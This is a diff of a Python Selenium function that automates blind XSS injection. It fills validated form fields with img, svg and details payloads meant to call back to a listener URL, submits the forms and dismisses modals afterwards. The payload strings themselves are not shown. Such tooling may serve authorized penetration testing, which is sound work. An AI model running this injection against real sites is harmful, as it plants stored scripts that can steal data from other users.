@@ -331,8 +331,11 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
     try:
         for campo in campos_validos:
             # Usa diretamente os campos que já foram validados pelo eco_test
-            field_name = campo['element'].get('name') or campo['element'].get('id')
-            field_id = campo['element'].get('id')
+            element = campo['element']
+            field_name = element.get('name') or element.get('id')
+            field_id = element.get('id')
+            
+            # Os campos já foram validados pelo eco_test, não precisa verificar tipo
             
             for payload_type in ['img', 'svg', 'details']:  # Um payload de cada tipo por campo
                 try:
@@ -349,29 +352,63 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                     payload = payloads[0] if payload_type == 'img' else \
                              payloads[1] if payload_type == 'svg' else payloads[2]
                     
-                    # Encontra o elemento novamente
-                    if campo['element']['id']:
-                        input_field = driver.find_element(By.ID, campo['element']['id'])
-                    elif campo['element']['name']:
-                        input_field = driver.find_element(By.NAME, campo['element']['name'])
-                    else:
+                    # Campo já foi validado pelo eco_test, só precisa encontrar novamente
+                    input_field = None
+                    
+                    if element['id']:
+                        input_field = driver.find_element(By.ID, element['id'])
+                    elif element['name']:
+                        input_field = driver.find_element(By.NAME, element['name'])
+                    
+                    if not input_field:
                         continue
- 
-                    # Injeção blind XSS
+                    
+                    # Tratamento especial apenas para mat-input-1 (já foi validado pelo eco_test)
+                    if element.get('id') == 'mat-input-1':
+                        # Força a ativação da barra de pesquisa
+                        try:
+                            search_icon = driver.find_element(By.XPATH, "//mat-icon[text()='search']")
+                            search_icon.click()
+                            time.sleep(1)
+                        except:
+                            pass
+                        
+                        # Força o foco usando JavaScript
+                        driver.execute_script("arguments[0].focus();", input_field)
+                        driver.execute_script("arguments[0].click();", input_field)
+                        time.sleep(0.5)
+                    
+                    # Injeção do payload blind XSS
                     input_field.clear()
                     input_field.send_keys(payload)
-                    input_field.send_keys(Keys.RETURN)
+                    
+                    # Submete o formulário - usa a mesma estratégia do eco_test
+                    try:
+                        # Procura por submit
+                        submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
+                        submit_button.click()
+                    except:
+                        # Procura por login 
+                        try:
+                            login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Log in')]")
+                            login_button.click()
+                        except:
+                            input_field.send_keys(Keys.RETURN)
+                    
+                    # Aguarda um pouco para a página processar
+                    time.sleep(2)
                     
                     injected_payloads.append({
                         'payload_id': payload_id,
                         'payload': payload,
                         'field_name': field_name,
+                        'payload_type': payload_type,
                         'status': 'injected'
                     })
                     
-                    print(f"[+] Payload {payload_id} injetado no campo {field_name}")
+                    print(f"[+] Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                     
-                    # Verifica se mudou de página após a injeção
+                    # Volta para a página original se necessário (mesma lógica do eco_test)
                     try:
                         current_url = driver.current_url
                         if current_url != original_url:
@@ -379,12 +416,23 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                             WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                             time.sleep(2)
                             
-                            # Fecha modais se necessário
+                            # Fecha modais que podem aparecer ao voltar
                             try:
-                                backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
-                                backdrop.click()
+                                close_button = driver.find_element(By.XPATH, "//button[contains(@class, 'close') or contains(@aria-label, 'close') or text()='×']")
+                                close_button.click()
                             except:
-                                pass
+                                try:
+                                    dismiss_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Dismiss') or contains(text(), 'OK')]")
+                                    dismiss_button.click()
+                                except:
+                                    try:
+                                        backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
+                                        backdrop.click()
+                                    except:
+                                        try:
+                                            driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
+                                        except:
+                                            pass
                     except Exception as nav_error:
                         print(f"[!] Erro ao navegar de volta: {nav_error}")
                     
@@ -397,4 +445,3 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
         return []
 
     return injected_payloads
-
